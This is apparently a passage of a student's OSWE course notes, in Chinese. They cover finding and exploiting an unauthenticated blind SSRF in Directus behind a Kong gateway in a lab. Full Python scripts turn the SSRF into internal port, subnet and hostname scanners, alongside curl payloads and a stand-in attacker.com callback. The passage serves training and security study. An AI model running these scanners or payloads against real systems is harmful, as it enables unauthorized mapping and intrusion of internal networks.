---
title: "[OSWE, WEB-300] Instructional notes - Part 5"
date: 2026-05-14
author: "CHW"
tags:
  - offsec
description: "OSWE WEB-300 筆記 Part 5，涵蓋 Server-Side Request Forgery、SSRF Port Scanning、SSRF Subnet Scanning、Render API Auth Bypass、Prototype Pollution、EJS Prototype Pollution RCE Exploitation、Handlebars Prototype Pollution RCE Exploitation 等等。"
---

[OSWE, WEB-300] Instructional notes - Part 5
===

# Table of Contents
[TOC]

# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 1"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-1/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-2/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-3/)
# [Link back to: "[OSWE, WEB-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/)

>[!Caution]
> 接續 [[OSWE, WEB-300] Instructional notes - Part 4](https://chw41.github.io/b1og/oswe-web-300-instructional-notes---part-4/) 內容


# Server-Side Request Forgery
以 black-box methodology 測試 API Gateway 後方的 microservices。

目標是從 Directus v9.0.0 rc34 的 SSRF 開始，逐步利用：
```
SSRF
  ↓
Internal Service Discovery
  ↓
Backend API Enumeration
  ↓
Vulnerability Chaining
  ↓
RCE
```

SSRF 漏洞由 Offensive Security 發現，並已揭露給 Directus 團隊進行修復

[環境範例]\
- http://apigateway:8000/	
- ssh://apigateway (`student`:`studentlab`)

## Introduction to Microservices
傳統 Web Application 常是 `Monolithic Application`
- 所有功能在同一個大型應用程式中
- login、users、products、checkout 都在同一套 codebase

Microservices 架構將功能拆成多個小服務: ([Agile](https://en.wikipedia.org/wiki/Agile_software_development) software development)
- Auth Service
- Users Service
- Cart Service
- Products Service
- Checkout Service

Microservice 的優點: 獨立開發、獨立部署、獨立擴展、可使用不同資料庫、服務之間透過 API 溝通

**Microservices 與 Container**\
Microservices 常跑在 `Docker`, `Kubernetes`, `Container runtime`\
會有以下
1. IP 可能變動
2. container 可快速建立或銷毀
3. service 之間需要互相通訊

通常依賴 DNS-based service discovery\
在 Docker Compose 裡：
```yaml
services:
  users:
  products:
  checkout:
```
Container 名稱通常可作為 hostname (對 SSRF 很重要)

Microservice 透過 API 暴露功能，當 API 透過 HTTP 或 HTTPS 公開時會被稱為 Web 服務。 常見類型：[`SOAP`](https://en.wikipedia.org/wiki/SOAP) 和 [`RESTful`](https://en.wikipedia.org/wiki/REST#Applied_to_web_services)

API Gateway 常提供:
1. Authentication
2. Authorization
3. Rate limiting
4. Input validation
5. TLS termination
6. Routing
7. Logging

攻擊者若可以繞過 API Gateway 即直接呼叫 backend service
```
attacker
  ↓
public API
  ↓
vulnerable server
  ↓
internal services
```
### Web Service URL Formats
不同 API Gateway 與 microservice 架構，會使用不同 URL routing 規則\
很多 API Gateway 其實只是 `Reverse Proxy` + `Router`
每個 API Gateway Routing 請求到服務端點的方式各不相同，但通常會使用正規表示式分析 URL
- `/user/*`: 可能全部轉發到 User Service
- `/product/*`: 可能全部轉發到 Product Service

API Gateway 可能設定：
```
/user        → users-service
/user/new    → users-service
/user/123    → users-service
```
🥚 Gateway 不一定知道 /user/new 和 /user/123\
真正解析這些 path 的是 backend servic\
**"Gateway 與 backend 對 URL 的理解不同"** 常是攻擊者利用的點

>[!Tip]
>理解 RESTful API URL 常見格式，對於以下很重要
>1. API Enumeration
>2. SSRF Discovery
>3. Internal Service Guessing
>4. Route Bruteforce

RESTful Web 服務 URL 格式多樣\
Ex. sample call from [Best Buy's APIs](https://bestbuyapis.github.io/api-documentation/#create-your-first-query)\
![image](https://hackmd.io/_uploads/SyL17dy1Ge.png)

#### 1. API Subdomain
```
https://api.bestbuy.com/v1/products/8880044.json
```
Part | Meaning | 
:------:|:------|
api.bestbuy.com  |   API 專用 subdomain    |
v1  |   API version    | 
products  |   service/resource    | 
8880044  |   product SKU    | 
.json  |   response format    | 

API Versioning 在很多 API 都有 v1, v2, v3 避免 breaking existing integrations，新版 API 不影響舊 client

`/products`, `/users`, `/orders`, `/auth` 通常為 Resource 或 Service 名稱，可以猜策 backend microservice

>[!Important]
>很多 REST API 支援 json\
>常也同時支援 XML\
>因此可能出現 `XXE`, `Deserialization`, `Parser confusion` 

#### 2. Path-based API
```
https://haveibeenpwned.com/api/v3/{service}/{parameter}
```
Ex. `/api/v3/breach/adobe`
Part | Meaning | 
:------:|:------|
api  |   API root   |
v3  |   version    | 
breach  |   service    | 
adobe  |   parameter    | 

這類設計 API 通常跑在 main domain，而不是 api.example.com\
透過 `/api/v3/`\
可以猜測以下路徑：
```
/api/v3/users
/api/v3/admin
/api/v3/auth
/api/v3/debug
```
#### 3. GitHub API
```
https://api.github.com/users/octocat
```
Part | Meaning | 
:------:|:------|
api.github.com  |   API subdomain   |
users  |   service    | 
octocat  |   parameter    | 

GitHub API 特點：沒有 /v1,/v2 versioning 會在 Accept header

## API Discovery via Verb Tampering
RESTful APIs 通常會和 HTTP request methods 綁在一起，不同的 HTTP Request 會做不同行為
Method | Action | 
:------:|:------|
GET /users/1  |   讀取 user   |
PUT /users/1  |   修改 user    | 
DELETE /users/1  |   刪除 user    | 

REST 常見 HTTP Verbs: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`

>[!Important]
>**SOAP 與 REST 差異:**
>- SOAP 也有 method，`application-level method` 不是 HTTP method\
>Ex. `lookupUser()`, `updateUser()`\
>且 SOAP 幾乎全部都 POST
>- REST API 的 HTTP Verb = 功能\
>只 fuzz path 不夠，還需要 fuzz HTTP method

### Initial Enumeration
curl 測試首頁\
![image](https://hackmd.io/_uploads/SJL3Bmekzx.png)
> Server: `kong/2.2.1`\
> Kong API Gateway

>[!Note]
>[Kong Gateway](https://konghq.com/products/kong-gateway):\
>Kong Gateway 是由 Kong Inc. 開發的雲原生 API Gateway 軟體，用於管理、保護與協調企業內部或外部 API 流量。建立於 NGINX 與 OpenResty 基礎上，具備高效能、可擴充的外掛架構，支援從微服務到 AI 應用的多種場景\
>Kong Gateway 是全球採用最廣的開源 API 閘道之一，並提供企業版與雲端託管服務
>用途：
>- routing
>- auth
>- rate limit
>- logging
>- TLS
>- API management
>
> 後面可能有大量 internal APIs

docs.konghq.com/gateway-oss/2.3.x/admin-api/ 顯示 Admin API 運行在 8001 port\
![image](https://hackmd.io/_uploads/HycsPmgyfl.png)
> Connection refused 可能沒開 externally

接著利用 gobuster 做 API Enumeration\
⚠️重點不是 fuzz path 而是觀察 status code
```
┌──(chw💲CHW)-[~/Offsec/OSWE/apigateway]
└─$ gobuster dir -u http://apigateway:8000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b "" -s "200,204,301,302,307,401,403,405,500"
```
![image](https://hackmd.io/_uploads/BJPe5NxJzg.png)
> 透過 status code 可以分類為：
> - 401 Unauthorized: endpoint 存在但需要 auth (最有價值)
> - 403 Forbidden: endpoint 存在但沒權限
> - 404: 不存在
```
sort endpoints.txt | cut -d" " -f1 | cut -d"/" -f2 > endpoints_sorted.txt
```
將可用 endpoint 整理成 txt\
![image](https://hackmd.io/_uploads/rJ9SXHlyGe.png)

將 txt 當做 wordlist，並掛上 proxy 用 Brup 觀察\
![image](https://hackmd.io/_uploads/rJzEUBgJfg.png)

在 Burp 中以 Status code 分類:
四條結果回傳 401 Forbidden
![image](https://hackmd.io/_uploads/S1zzvBeyzl.png)
> `WWW-Authenticate: Key realm="kong"` 需要 API Key 
> > Kong 自己做 auth

/users* 和 /files* 會回傳 HTTP 403 
![image](https://hackmd.io/_uploads/SJ7qKHxJGx.png)
> `X-Powered-By: Directus`
> 判斷後端是用 [Directus](https://directus.io/)\
> 且 `directus_files\` 暴露後端 collection name
> > 透過 403 error message 可以得知路徑: `directus_users`, `directus_files`

>[!Note]
>Directus 是一個開源的資料平台與 headless CMS，會把任何 SQL 資料庫包裝成即用的 REST/GraphQL API，加上一個直覺的後台介面，讓工程師、內容編輯與其他服務（包含 AI）可以在同一份即時資料上協作。它常被用來取代傳統 CMS 或自寫後端，作為通用的 API 平台。
>> - 開源資料平台 + headless CMS + API-first 後端
>> - 支援多種 SQL（PostgreSQL、MySQL、SQLite、MariaDB、MS SQL…）
>> - 自動產生 REST 與 GraphQL

目前已知：
- `/render`: 需要 API key
- `/users`: Directus
- `/files`: Directus

### Advanced Enumeration with Verb Tampering
近一步 enum RESTful API 常見 URL pattern：\
`<object>/<action>`, `<object>/<identifier>`
Ex.
```
/files/import
/users/invite
/users/123
/render/html
```
把已知 endpoint 當成 base path，再接上一組 action wordlist\
並使用不同 HTTP method

🥚 因為 Gobuster 指定 method (-X POST)，在整次 scan 中只會用一種 method

自己撰寫測試腳本 (route_buster.py)
1. 讀取 base endpoints，例如 files/users/render
2. 讀取 action wordlist，例如 import/invite/home
3. 組合成 /files/import
4. 對同一 URL 發 GET 和 POST
5. 如果 status code 不是常見無用碼，就印出

需要三個參數：
- `-t` target
- `-w` base endpoint wordlist
- `-a` action wordlist

(完整 route_buster.py)
```pyhton
#!/usr/bin/env python3

import argparse
import requests


parser = argparse.ArgumentParser()
parser.add_argument('-a', '--actionlist', help='actionlist to use', required=True)
parser.add_argument('-t', '--target', help='host/ip to target', required=True)
parser.add_argument('-w', '--wordlist', help='wordlist to use', required=True)
args = parser.parse_args()


actions = []

with open(args.actionlist, "r") as a:
    for line in a:
        action = line.strip()
        if action:
            actions.append(action)


print("Path                - \tGet\tPost")

with open(args.wordlist, "r") as f:
    for word in f:
        base = word.strip()

        if not base:
            continue

        for action in actions:
            print(f"\r/{base}/{action}", end="")

            url = f"{args.target.rstrip('/')}/{base}/{action}"

            try:
                r_get = requests.get(url=url, timeout=10).status_code
            except requests.RequestException:
                r_get = "ERR"

            try:
                r_post = requests.post(url=url, timeout=10).status_code
            except requests.RequestException:
                r_post = "ERR"

            if r_get not in [204, 401, 403, 404] or r_post not in [204, 401, 403, 404]:
                print("                    \r", end="")
                print(f"/{base}/{action:10} - \t{r_get}\t{r_post}")

print("\r", end="")
print("Wordlist complete. Goodbye.")
```
建立 endpoints_simple.txt
```
cat > endpoints_simple.txt << 'EOF'
files
users
render
EOF
```
![image](https://hackmd.io/_uploads/rk8irIlyfe.png)

```
┌──(chw💲CHW)-[~/Offsec/OSWE/apigateway]
└─$ ./route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000                                    
[2026-05-12 03:36:03] ./route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000
Path                -   Get     Post
/files/import     -     403     400
/users/frame      -     200     404
/users/home       -     200     404
/users/invite     -     403     400
/users/readme     -     200     404
/users/welcome    -     200     404
/users/wellcome   -     200     404
Wordlist complete. Goodbye.
```
> GET 200：
> - `/users/frame`
> - `/users/home`
> - `/users/readme`
> - `/users/welcome`
> - `/users/wellcome`
> 瀏覽後沒有明顯有價值內容\
> 🥚 `POST /files/import → 400`, `POST /users/invite → 400`\
> 代表 endpoint 存在， request 格式錯了缺少必要參數

實際測試 /files/import
![image](https://hackmd.io/_uploads/H1ljvKUlyfe.png)
> 洩漏 url is required，代表需要 url parameter

需要 url 也透漏出可以優先嘗試 SSRF:
```
POST /files/import
url=http://attacker.com/test
```

接著要測試 `/files/import` 是否讓  Directus backend 去請求指定 URL

## Introduction to Server-Side Request Forgery
SSRF（Server-Side Request Forgery）: Attacker 讓 Server 代替自己發送 request

>[!Note]
>SSRF 詳細介紹可參考 [OSWA Note 2](https://chw41.github.io/b1og/oswa-web-200-instructional-notes---part-2/#introduction-to-ssrf)\
>![image](https://hackmd.io/_uploads/S1AP2Lgyzx.png)

### Server-Side Request Forgery Discovery
接續上述測試洩漏的 error message:
```
{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}
```
測試 server 會不會真的對 URL 發 request
- 啟用 Apache
![image](https://hackmd.io/_uploads/HyBP6Ll1zl.png)
- 發送 SSRF 測試
![image](https://hackmd.io/_uploads/BJR5pIl1zg.png)
> 500 INTERNAL_SERVER_ERROR
- 驗證 Apache log 
![image](https://hackmd.io/_uploads/HkBRpLgkMl.png)
> 代表 Directus backend 真實發 request 到 Kali
>> User-Agent: axios/0.21.1
>> **(Axios 是 Node.js HTTP client)**
- 建立真實 /ssrftest 路徑
```
┌──(root㉿CHW)-[/home/chw/Offsec/OSWE/apigateway]
└─# echo chw > /var/www/html/ssrftest
```
- 再送一次 request
![image](https://hackmd.io/_uploads/BJH1yvl1ze.png)
> 403 Forbidden
- Apache log 再次確認
![image](https://hackmd.io/_uploads/HkcMJPlkfl.png)

可以確認 `/files/import` 存在 unauthenticated SSRF 且 server 會 request attacker-controlled URL
👉🏻 屬於 Blind SSRF (不能直接看到 response content)

### Source Code Analysis
Directus 是 open source，因此可以透過 source code 確認 SSRF 的 root cause

[Authentication Handler](https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/middleware/authenticate.ts) 在 `/api/src/middleware/authenticate.ts`
```TypeScript
12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => {
13    req.accountability = {
14      user: null,
15      role: null,
16      admin: false,
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip,
18      userAgent: req.get('user-agent'),
19    };
20  
21    if (!req.token) return next();
22  
23    if (isJWT(req.token)) {
```
L13 到 L19 在請求上建立了一個新的 accountability object。user 和role 變數被設定為 null。接著檢查請求物件上是否存在 token\
若沒有 token (`if (!req.token) return next();`)，則函數傳回 next() 並將執行傳遞給下一個 middleware function\
(代表沒有 token 也允許繼續，只是身份是 anonymous)

`/api/src/controllers/files.ts` 定義的 files controller 的程式碼 
```TypeScript
138  router.post(
139    '/import',
140    asyncHandler(async (req, res, next) => {
141      const { error } = importSchema.validate(req.body);
142  
143      if (error) {
144        throw new InvalidPayloadException(error.message);
145      }
146  
147      const service = new FilesService({
148        accountability: req.accountability,
149        schema: req.schema,
150      });
```
> - 當我們沒有送 url 時，才會看到 "\"url\" is required"\
> - 建立 FilesService 將剛才 middleware 建立的 accountability 傳進去
> - SSRF Root Cause
> ```TypeScript
> const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
>  responseType: 'stream',
>});
> ```
> Directus 使用 `req.body.url` 透過 `axios.get()` 讓 server 發出 HTTP request，也是在此導致 Unauthenticated SSRF

L152 使用 axios 函式庫請求 url 參數中提交的值，將請求結果儲存在fileResponse 變數中。此時的 code 尚未檢查傳送到檔案控制器的初始請求是否包含有效的 JWT
```TypeScript
152      const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
153        responseType: 'stream',
154      });
155  
156      const parsedURL = url.parse(fileResponse.request.res.responseUrl);
157      const filename = path.basename(parsedURL.pathname as string);
158  
159      const payload = {
160        filename_download: filename,
161        storage: toArray(env.STORAGE_LOCATIONS)[0],
162        type: fileResponse.headers['content-type'],
163        title: formatTitle(filename),
164        ...(req.body.data || {}),
165      };
```
直到 L170 才遇到身份驗證檢查:\
FileService 的 readByKey()函數負責檢查授權\
FileService 繼承自 ItemService 的 readByKeys() 函數\
`/api/src/services/authorization.ts`定義的 processAST() 函數 
處理授權
```TypeScript
167      const primaryKey = await service.upload(fileResponse.data, payload);
168  
169      try {
170        const record = await service.readByKey(primaryKey, req.sanitizedQuery);
171        res.locals.payload = { data: record || null };
172      } catch (error) {
173        if (error instanceof ForbiddenException) {
174          return next();
175        }
```
目前研究流程：
```
Unauthenticated request
        ↓
authenticate middleware 建立 anonymous accountability
        ↓
/files/import controller validate body
        ↓
axios.get(req.body.url)
        ↓
SSRF 已發生
        ↓
service.upload()
        ↓
service.readByKey()
        ↓
authorization check
        ↓
Forbidden
```
### Exploiting Blind SSRF in Directus
目前 `/files/import` 存在 unauthenticated blind SSRF，🥚 看不到 response body：可以觀察 side effects
* 不同 error message
* timeout
* connection refused
* HTTP status difference
* DNS callback
* timing

目前 status code 可以得知： 
- 有效 resource
    - 若 URL 存在：Apache 回 200
    - Directus 回：403 Forbidden
    代表 axios.get() 成功，後續 authorization 失敗
- 不存在 resource
    - 若 URL 不存在：Apache 回 404
    - Directus 回：500 Internal Server Error
    內容 Request failed with status code 404
    
👉🏻 Boolean-based SSRF Oracle

開始測試 SSRF localhost 8000 port
```
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8000/"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/SysBdPxyzl.png)
已知 API Gateway server 上的 8000 port 是對外開放的，但是如果 Directus 運行在 API Gateway 後面的另一台伺服器上\
測試指定的 "localhost" 指的是執行 Directus 的 Server，而不是執行 Kong API Gateway server
```
Kong API Gateway
↓ reverse proxy
Directus backend
```

🔍 上網搜尋能得知 Directus default port 是 8055

```
curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8055/"}' http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/Syy4YDlJze.png)
> 能夠得知 localhost:8055 可連線 👉🏻 Directus 在 localhost:8055 提供服務

![image](https://hackmd.io/_uploads/SkS5tPekGx.png)

### Port Scanning via Blind SSRF
上述透過 status code 判斷後端服務是否啟用\
blind SSRF 看不到 response body 也可以透過 error message, timeout, connection refused, parse error 推測目標 port 是否開啟

透過自己撰寫腳本 ssrf_port_scanner.py 掃描常見 port
```
22      SSH
80      HTTP
443     HTTPS
1433    MSSQL
1521    Oracle
3306    MySQL
3389    RDP
5000    Flask / dev service
5432    PostgreSQL
5900    VNC
6379    Redis
8000    Web / API gateway
8001    Kong Admin API
8055    Directus default
8080    Web
8443    HTTPS alt
9000    Dev / app service
```
目前的 Error Message Mapping:\
![image](https://hackmd.io/_uploads/SJTF9PeyMx.png)

(完整 ssrf_port_scanner.py)
```python
#!/usr/bin/env python3

import argparse
import requests


COMMON_PORTS = [
    22, 80, 443, 1433, 1521, 3306, 3389, 5000,
    5432, 5900, 6379, 8000, 8001, 8055, 8080,
    8443, 9000
]


def classify_response(text):
    if "You don't have permission to access this." in text:
        return "OPEN - HTTP service returned permission error, valid resource"

    if "Request failed with status code 404" in text:
        return "OPEN - HTTP service returned 404"

    if "Request failed with status code 400" in text:
        return "OPEN - HTTP service returned 400"

    if "Request failed with status code 401" in text:
        return "OPEN - HTTP service returned 401"

    if "Request failed with status code 403" in text:
        return "OPEN - HTTP service returned 403"

    if "ECONNREFUSED" in text:
        return "CLOSED"

    if "Parse Error" in text or "HPE_" in text:
        return "OPEN - non-HTTP or malformed HTTP response"

    if "socket hang up" in text:
        return "OPEN - socket hang up, likely non-HTTP"

    if "ETIMEDOUT" in text or "timeout" in text.lower():
        return "TIMEOUT - filtered or slow service"

    if "ENOTFOUND" in text:
        return "DNS_FAIL - hostname not found"

    if "EHOSTUNREACH" in text or "ENETUNREACH" in text:
        return "UNREACHABLE - host or network unreachable"

    return "UNKNOWN - " + text[:120].replace("\n", " ")


def scan_port(target, ssrf_host, port, timeout, verbose):
    url = f"{ssrf_host}:{port}"

    try:
        r = requests.post(
            url=target,
            json={"url": url},
            timeout=timeout
        )

        if verbose:
            print(f"[DEBUG] {port} HTTP {r.status_code}: {r.text}")

        return classify_response(r.text)

    except requests.exceptions.Timeout:
        return "TIMEOUT - request to SSRF endpoint timed out"

    except requests.exceptions.RequestException as e:
        return f"ERROR - {e}"


def parse_ports(port_arg):
    if not port_arg:
        return COMMON_PORTS

    ports = []

    for part in port_arg.split(","):
        part = part.strip()

        if "-" in part:
            start, end = part.split("-", 1)
            ports.extend(range(int(start), int(end) + 1))
        else:
            ports.append(int(part))

    return sorted(set(ports))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="SSRF vulnerable endpoint, e.g. http://apigateway:8000/files/import"
    )
    parser.add_argument(
        "-s", "--ssrf",
        required=True,
        help="host to scan from SSRF, e.g. http://localhost"
    )
    parser.add_argument(
        "-p", "--ports",
        required=False,
        help="ports to scan, e.g. 22,80,443,8000-8010"
    )
    parser.add_argument(
        "--timeout",
        required=False,
        default=3,
        type=float,
        help="request timeout"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        default=False,
        help="enable verbose mode"
    )

    args = parser.parse_args()

    ports = parse_ports(args.ports)

    print("Port\tStatus")
    print("----\t------")

    for port in ports:
        result = scan_port(
            target=args.target,
            ssrf_host=args.ssrf.rstrip("/"),
            port=port,
            timeout=args.timeout,
            verbose=args.verbose
        )

        print(f"{port}\t{result}")


if __name__ == "__main__":
    main()
```
執行腳本測試
```
./ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5
```
![image](https://hackmd.io/_uploads/r12GjPlJzx.png)
> 結果不理想，只掃出已知 8055

### Subnet Scanning with SSRF
Directus 是用來管理 SQL database 的平台，可以合理推測：
```text
Directus backend
  ↓
Database server
```
🥚 不知道內部 IP range

掃描內網的兩種方法:
1. Hostname brute force
Ex. `http://db`, `http://postgres`, `http://mysql`, `http://kong`
缺點:
- 需要好的 hostname wordlist
- DNS lookup 會增加延遲
- DNS fail 可能造成 timeout 或 false negative

2. Private IP range scan

Range | Address Count | 
:------:|:------|
10.0.0.0/8  |   16,777,216   |
172.16.0.0/12  |   1,048,576   | 
192.168.0.0/16  |   65,536   | 

用 SSRF 掃整個 `/8` 或 `/12` 網段會非常慢\
🧠：大多網路設計常用 x.x.x.1 作為 gateway\
因此可以先掃每個 subnet 的 .1 IP

先測試 Host 存在但 port closed:
```
curl -X POST \
-H "Content-Type: application/json" \
-d '{"url":"http://127.0.0.1:6666"}' \
http://apigateway:8000/files/import \
-s -w 'Total: %{time_total}\n' \
-o /dev/null
```
![image](https://hackmd.io/_uploads/ByzTkux1Mx.png)
> Total: 0.302299 ms
>> host 存在、port closed、快速 ECONNREFUSED

在測試 Host 不存在 / 不可達\
![image](https://hackmd.io/_uploads/rJ9GWOeyzl.png)
> Total: 0.505437 ms
> > host 不可達、等待 timeout

開始撰寫腳本，測試 `172.x.x.1`, `192.168.x.1`, `10.x.x.1`

(完整 ssrf_gateway_scanner.py)
```python
#!/usr/bin/env python3

import argparse
import requests


def classify(text):
    if "You don't have permission to access this." in text:
        return "OPEN - returned permission error, therefore valid resource"

    if "Request failed with status code 404" in text:
        return "OPEN - returned 404"

    if "Request failed with status code 400" in text:
        return "OPEN - returned 400"

    if "Request failed with status code 401" in text:
        return "OPEN - returned 401"

    if "Request failed with status code 403" in text:
        return "OPEN - returned 403"

    if "ECONNREFUSED" in text:
        return "HOST UP - port closed"

    if "Parse Error" in text or "HPE_" in text:
        return "OPEN - non-HTTP service"

    if "socket hang up" in text:
        return "OPEN - socket hang up, likely non-HTTP"

    if "ENOTFOUND" in text:
        return "DNS_FAIL"

    if "EHOSTUNREACH" in text or "ENETUNREACH" in text:
        return "UNREACHABLE"

    if "ETIMEDOUT" in text or "timeout" in text.lower():
        return "TIMEOUT"

    return "UNKNOWN"


def probe(target, host, port, timeout, verbose=False):
    try:
        r = requests.post(
            url=target,
            json={"url": f"{host}:{port}"},
            timeout=timeout
        )

        if verbose:
            print(f"[DEBUG] {host}:{port} HTTP {r.status_code} {r.text[:160]}")

        return classify(r.text)

    except requests.exceptions.Timeout:
        return "TIMEOUT"

    except requests.exceptions.RequestException as e:
        return f"ERROR - {e}"


def scan_172(target, port, timeout, verbose=False):
    base_ip = "http://172.{two}.{three}.1"

    for two in range(16, 32):
        for three in range(1, 256):
            host = base_ip.format(two=two, three=three)

            print(f"Trying host: {host}")
            result = probe(target, host, port, timeout, verbose)

            if result != "TIMEOUT":
                print(f"\t{port}\t{result}")


def scan_192(target, port, timeout, verbose=False):
    base_ip = "http://192.168.{three}.1"

    for three in range(0, 256):
        host = base_ip.format(three=three)

        print(f"Trying host: {host}")
        result = probe(target, host, port, timeout, verbose)

        if result != "TIMEOUT":
            print(f"\t{port}\t{result}")


def scan_10(target, port, timeout, verbose=False):
    base_ip = "http://10.{two}.{three}.1"

    for two in range(0, 256):
        for three in range(0, 256):
            host = base_ip.format(two=two, three=three)

            print(f"Trying host: {host}")
            result = probe(target, host, port, timeout, verbose)

            if result != "TIMEOUT":
                print(f"\t{port}\t{result}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="SSRF endpoint, e.g. http://apigateway:8000/files/import"
    )
    parser.add_argument(
        "-r", "--range",
        choices=["172", "192", "10"],
        default="172",
        help="private range to scan"
    )
    parser.add_argument(
        "-p", "--port",
        default=8000,
        type=int,
        help="single port to probe"
    )
    parser.add_argument(
        "--timeout",
        default=5,
        type=float,
        help="request timeout"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true"
    )

    args = parser.parse_args()

    if args.range == "172":
        scan_172(args.target, args.port, args.timeout, args.verbose)
    elif args.range == "192":
        scan_192(args.target, args.port, args.timeout, args.verbose)
    elif args.range == "10":
        scan_10(args.target, args.port, args.timeout, args.verbose)


if __name__ == "__main__":
    main()
```
執行掃描
```
./ssrf_gateway_scanner.py -t http://apigateway:8000/files/import
```
![image](https://hackmd.io/_uploads/SyzC4OeJGx.png)
> 172.16.16.1 是 live host

**Extra Mile：Hostname Enumeration**\
建立  hosts.txt 透過 hostname 爆破掃描\
![image](https://hackmd.io/_uploads/SJcFBOeJMl.png)\
 (完整 ssrf_hostname_scanner.py)
```python
#!/usr/bin/env python3

import argparse
import requests


def classify(text):
    if "You don't have permission to access this." in text:
        return "OPEN - permission error"

    if "Request failed with status code 404" in text:
        return "OPEN - HTTP 404"

    if "Request failed with status code" in text:
        return "OPEN - HTTP error"

    if "ECONNREFUSED" in text:
        return "HOST FOUND - port closed"

    if "ENOTFOUND" in text:
        return "DNS_FAIL"

    if "ETIMEDOUT" in text or "timeout" in text.lower():
        return "TIMEOUT"

    if "Parse Error" in text or "socket hang up" in text:
        return "OPEN - non-HTTP"

    return "UNKNOWN"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-w", "--wordlist", required=True)
    parser.add_argument("-p", "--port", default=80, type=int)
    parser.add_argument("--timeout", default=5, type=float)
    args = parser.parse_args()

    with open(args.wordlist, "r") as f:
        for line in f:
            host = line.strip()
            if not host:
                continue

            ssrf_url = f"http://{host}:{args.port}"

            try:
                r = requests.post(
                    args.target,
                    json={"url": ssrf_url},
                    timeout=args.timeout
                )
                result = classify(r.text)

            except requests.exceptions.Timeout:
                result = "TIMEOUT"

            except requests.exceptions.RequestException as e:
                result = f"ERROR - {e}"

            if result not in ["DNS_FAIL", "TIMEOUT"]:
                print(f"{host}:{args.port}\t{result}")


if __name__ == "__main__":
    main()
``` 
測試 hostname
```
./ssrf_hostname_scanner.py  -t http://apigateway:8000/files/import  -w hosts.txt  -p 8000 --timeout 5
```
![image](https://hackmd.io/_uploads/H1juIOeyMg.png)
> 可以找到 4 個 hostname

### Host Enumeration
前面透過 gateway scanner 找到 172.16.16.1\
可以猜測內部網段可能是 `172.16.16.0/24`，接著可以縮小範圍找出  live hosts

建立腳本 ssrf_subnet_scanner.py 掃描 172.16.16.1 - 172.16.16.254\
👉🏻 目的不是確認服務，而是確認 host 是否存在

(完整 ssrf_subnet_scanner.py)
```python
#!/usr/bin/env python3

import argparse
import requests

COMMON_PORTS = [
    22, 80, 443, 1433, 1521, 3306, 3389, 5000,
    5432, 5900, 6379, 8000, 8001, 8055, 8080,
    8443, 9000
]


def classify(text):
    if "You don't have permission to access this." in text:
        return "OPEN - returned permission error, therefore valid resource"
    if "Request failed with status code 404" in text:
        return "OPEN - returned 404"
    if "Request failed with status code 400" in text:
        return "OPEN - returned 400"
    if "Request failed with status code 401" in text:
        return "OPEN - returned 401"
    if "Request failed with status code 403" in text:
        return "OPEN - returned 403"
    if "ECONNREFUSED" in text:
        return "Connection refused, could be live host"
    if "EHOSTUNREACH" in text:
        return "EHOSTUNREACH"
    if "ENETUNREACH" in text:
        return "ENETUNREACH"
    if "ENOTFOUND" in text:
        return "DNS_FAIL"
    if "ETIMEDOUT" in text or "timeout" in text.lower():
        return "TIMEOUT"
    if "Parse Error" in text or "HPE_" in text:
        return "OPEN - returned parse error, potentially open non-http"
    if "socket hang up" in text:
        return "OPEN - socket hang up, likely non-http"

    return "UNKNOWN - " + text[:160].replace("\n", " ")


def parse_ports(port_arg):
    if not port_arg:
        return COMMON_PORTS

    ports = []

    for part in port_arg.split(","):
        part = part.strip()

        if "-" in part:
            start, end = part.split("-", 1)
            ports.extend(range(int(start), int(end) + 1))
        else:
            ports.append(int(part))

    return sorted(set(ports))


def parse_hosts(subnet, hosts_arg):
    hosts = []

    if hosts_arg:
        for part in hosts_arg.split(","):
            part = part.strip()

            if "-" in part:
                start, end = part.split("-", 1)
                for i in range(int(start), int(end) + 1):
                    hosts.append(f"{subnet}.{i}")
            else:
                hosts.append(f"{subnet}.{int(part)}")
    else:
        for i in range(1, 255):
            hosts.append(f"{subnet}.{i}")

    return hosts


def probe(target, host, port, timeout, verbose=False):
    ssrf_url = f"http://{host}:{port}"

    try:
        r = requests.post(
            url=target,
            json={"url": ssrf_url},
            timeout=timeout
        )

        if verbose:
            print(f"[DEBUG] {host}:{port} HTTP {r.status_code}")
            print(r.text[:300])

        return classify(r.text)

    except requests.exceptions.Timeout:
        return "TIMEOUT"

    except requests.exceptions.RequestException as e:
        return f"ERROR - {e}"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="SSRF endpoint, e.g. http://apigateway:8000/files/import"
    )
    parser.add_argument(
        "--subnet",
        default="172.16.16",
        help="subnet prefix, e.g. 172.16.16"
    )
    parser.add_argument(
        "--hosts",
        required=False,
        help="host octets, e.g. 1-6 or 1,2,3"
